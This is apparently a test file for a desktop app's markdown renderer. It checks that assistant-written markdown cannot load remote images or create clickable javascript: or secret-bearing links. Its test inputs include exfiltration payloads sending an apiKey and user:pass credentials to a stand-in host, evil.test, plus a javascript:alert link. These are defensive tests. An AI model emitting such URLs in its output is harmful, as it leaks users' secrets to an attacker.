import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { openUrl } from "@tauri-apps/plugin-opener";
import MarkdownRenderer from "./markdown-renderer";

vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));

describe("assistant markdown links", () => {
  it("does not load remote images or create unsafe clickable URLs", () => {
    const { container } = render(<MarkdownRenderer content={"![secret](https://evil.test/img?apiKey=abc) [open](javascript:alert(1))"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.queryByRole("link", { name: "open" })).toBeNull();
  });

  it("does not make secret-bearing URLs clickable", () => {
    render(<MarkdownRenderer content={"[leak](https://evil.test/collect?apiKey=private-value) [userinfo](https://user:pass@evil.test/collect)"} />);
    expect(screen.queryByRole("link", { name: "leak" })).toBeNull();
    expect(screen.queryByRole("link", { name: "userinfo" })).toBeNull();
  });

  it("opens only HTTP links after a click", async () => {
    render(<MarkdownRenderer content={"[safe](https://example.com/report)"} />);
    const link = screen.getByRole("link", { name: "safe" });
    expect(link).toHaveAttribute("href", "https://example.com/report");
    fireEvent.click(link);
    await waitFor(() => expect(openUrl).toHaveBeenCalledWith("https://example.com/report"));
  });

  it("keeps public address explorer links clickable", () => {
    render(<MarkdownRenderer content={"[wallet](https://etherscan.io/address/0x52908400098527886E0F7030069857D2E4169EE7) [sol](https://solscan.io/account/9WzDXwBbmkg8XDbB4dNq3uVQhQ6C7PDkA9Aw6t4C3kLw)"} />);
    expect(screen.getByRole("link", { name: "wallet" })).toHaveAttribute(
      "href", "https://etherscan.io/address/0x52908400098527886E0F7030069857D2E4169EE7",
    );
    expect(screen.getByRole("link", { name: "sol" })).toHaveAttribute(
      "href", "https://solscan.io/account/9WzDXwBbmkg8XDbB4dNq3uVQhQ6C7PDkA9Aw6t4C3kLw",
    );
  });
});
